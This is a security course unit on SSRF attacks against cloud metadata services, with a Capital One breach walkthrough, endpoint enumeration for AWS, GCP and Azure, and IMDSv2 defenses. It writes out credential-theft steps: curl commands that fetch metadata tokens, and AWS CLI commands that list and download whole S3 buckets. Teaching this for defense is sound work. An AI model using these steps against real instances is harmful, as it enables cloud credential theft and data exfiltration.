# Unit 10: A10 - Server-Side Request Forgery (SSRF) — Topic 2: Cloud Metadata Attacks

## Overview

Cloud metadata services provide instance information, credentials, and configuration data to virtual machines via a **link-local HTTP endpoint** (169.254.169.254). Since this endpoint is accessible from within the instance without authentication, SSRF vulnerabilities in cloud-hosted applications can expose **IAM credentials, API keys, user data scripts, and network configuration** — often leading to full cloud account compromise.

---

## 1. Cloud Metadata Services

```
METADATA ENDPOINTS BY PROVIDER:

AWS (IMDSv1 — no auth required):
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.169.254/latest/user-data/
  http://169.254.169.254/latest/dynamic/instance-identity/document

GCP:
  http://metadata.google.internal/computeMetadata/v1/
  (Requires header: Metadata-Flavor: Google)

Azure:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  (Requires header: Metadata: true)

DigitalOcean:
  http://169.254.169.254/metadata/v1/
```

---

## 2. AWS Metadata Attack (Capital One Breach 2019)

```
ATTACK FLOW (Real-world breach — 100M records stolen):

1. SSRF VULNERABILITY
   WAF misconfiguration allowed SSRF in web application

2. ACCESS METADATA
   GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → Returns: "WAF-Role"
   
   GET http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-Role
   → Returns:
   {
     "AccessKeyId": "AKIA...",
     "SecretAccessKey": "wJalr...",
     "Token": "FQoGZX...",
     "Expiration": "2024-01-15T12:00:00Z"
   }

3. USE CREDENTIALS
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=wJalr...
   export AWS_SESSION_TOKEN=FQoGZX...
   
   aws s3 ls                              # List all S3 buckets
   aws s3 sync s3://customer-data ./data   # Download all data

DATA STOLEN: 100+ million credit applications
FINE: $80 million + $190 million settlement
```

---

## 3. AWS Metadata Enumeration

```bash
# Step 1: Discover instance metadata
http://169.254.169.254/latest/meta-data/

# Key endpoints:
/latest/meta-data/ami-id              # AMI ID
/latest/meta-data/hostname            # Internal hostname
/latest/meta-data/local-ipv4          # Private IP
/latest/meta-data/public-ipv4         # Public IP
/latest/meta-data/security-groups     # Security groups
/latest/meta-data/network/interfaces/ # Network config

# Step 2: Get IAM role name
/latest/meta-data/iam/security-credentials/
→ Returns role name, e.g., "EC2-S3-ReadWrite"

# Step 3: Get temporary credentials
/latest/meta-data/iam/security-credentials/EC2-S3-ReadWrite
→ Returns AccessKeyId, SecretAccessKey, Token

# Step 4: Get user-data (often contains secrets!)
/latest/user-data
→ May contain: database passwords, API keys, bootstrap scripts

# Step 5: Get instance identity document
/latest/dynamic/instance-identity/document
→ Returns: accountId, region, instanceId
```

---

## 4. GCP and Azure Metadata

```bash
# GCP — Requires Metadata-Flavor header (harder to exploit via basic SSRF)
# But if SSRF allows custom headers:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Response: {"access_token":"ya29.AHES...","expires_in":3599,"token_type":"Bearer"}

# GCP key endpoints:
/computeMetadata/v1/project/project-id
/computeMetadata/v1/instance/hostname
/computeMetadata/v1/instance/service-accounts/default/email
/computeMetadata/v1/instance/service-accounts/default/token
/computeMetadata/v1/instance/attributes/ssh-keys

# Azure — Requires Metadata: true header
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Azure key endpoints:
/metadata/instance/compute?api-version=2021-02-01
/metadata/identity/oauth2/token
/metadata/instance/network
```

---

## 5. Defense: IMDSv2 and Metadata Protection

```
AWS IMDSv2 (Instance Metadata Service v2):
  Requires a PUT request to get a TOKEN first
  Then use TOKEN as header in subsequent requests
  SSRF attacks typically can't do PUT requests!

  # Normal access (requires two-step process):
  TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  
  curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/

  # Enforce IMDSv2 (disable v1):
  aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-endpoint enabled

GCP:
  → Already requires Metadata-Flavor: Google header
  → Most basic SSRF can't add custom headers

Azure:
  → Requires Metadata: true header
  → Similar protection to GCP

ADDITIONAL PROTECTIONS:
1. Restrict IAM role permissions (least privilege)
2. Use VPC endpoints instead of metadata for secrets
3. Use AWS Secrets Manager / Azure Key Vault / GCP Secret Manager
4. Network segmentation — block 169.254.169.254 from application layer
5. Monitor for metadata API access in CloudTrail
```

---

## Summary Table

| Cloud Provider | Endpoint | Header Required | Defense |
|---------------|----------|----------------|---------|
| AWS (IMDSv1) | 169.254.169.254 | None | Upgrade to IMDSv2 |
| AWS (IMDSv2) | 169.254.169.254 | Token from PUT | Enforce `--http-tokens required` |
| GCP | metadata.google.internal | Metadata-Flavor: Google | Already protected |
| Azure | 169.254.169.254 | Metadata: true | Already protected |
| DigitalOcean | 169.254.169.254 | None | Network rules |

---

## Revision Questions

1. What is a cloud metadata service and why is it a prime SSRF target?
2. Walk through the Capital One breach — how did SSRF lead to 100M records stolen?
3. Enumerate all AWS metadata endpoints that could expose sensitive information.
4. What is IMDSv2 and how does it prevent SSRF-based metadata access?
5. Compare metadata security across AWS, GCP, and Azure.
6. What additional defenses should be deployed beyond IMDSv2?

---

*Previous: [01-ssrf-attack-vectors.md](01-ssrf-attack-vectors.md) | Next: [03-internal-service-access.md](03-internal-service-access.md)*

---

*[Back to README](../README.md)*
